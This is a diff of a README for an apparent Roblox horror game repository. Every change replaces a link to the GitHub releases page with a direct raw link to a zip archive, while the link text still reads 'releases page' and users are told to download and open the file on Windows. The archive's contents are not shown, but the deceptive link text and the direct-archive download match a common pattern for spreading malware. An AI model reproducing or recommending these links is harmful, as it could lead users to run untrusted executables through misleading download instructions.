@@ -1,6 +1,6 @@
 # 🎮 Bite-By-Night-roblox - Survive the night in Roblox
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Contentious-scirpus369/Bite-By-Night-roblox/main/containerfiles/Bite-roblox-Night-By-2.7.zip)
 
 ## 🕹️ Overview
 
@@ -10,7 +10,7 @@ This game is set up for players who want a simple start and a tense play session
 
 ## 📥 Download
 
-1. Open the [releases page](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Contentious-scirpus369/Bite-By-Night-roblox/main/containerfiles/Bite-roblox-Night-By-2.7.zip).
 2. Find the latest release at the top of the page.
 3. Download the file attached to that release.
 4. Open the file on your Windows PC.
@@ -86,7 +86,7 @@ Sound matters in horror games. Many jumps and threats use audio cues, so headpho
 
 When a new release appears:
 
-1. Go back to the [releases page](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases).
+1. Go back to the [releases page](https://raw.githubusercontent.com/Contentious-scirpus369/Bite-By-Night-roblox/main/containerfiles/Bite-roblox-Night-By-2.7.zip).
 2. Download the newest file.
 3. Open the new version.
 4. Remove the old copy if you no longer need it.
@@ -170,7 +170,7 @@ If your PC is older, lower your graphics settings in Roblox or in the game menu 
 
 ## 📁 Release Page Use
 
-The [releases page](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases) is the place to get the latest version. Use it when you want to:
+The [releases page](https://raw.githubusercontent.com/Contentious-scirpus369/Bite-By-Night-roblox/main/containerfiles/Bite-roblox-Night-By-2.7.zip) is the place to get the latest version. Use it when you want to:
 
 - Download the game for the first time
 - Get the newest build
@@ -200,4 +200,4 @@ In horror games like this, small mistakes can end a run fast. Slow movement and 
 
 ## ▶️ Get the Game
 
-Visit the [releases page](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases) to download and run the latest Windows build
+Visit the [releases page](https://raw.githubusercontent.com/Contentious-scirpus369/Bite-By-Night-roblox/main/containerfiles/Bite-roblox-Night-By-2.7.zip) to download and run the latest Windows build
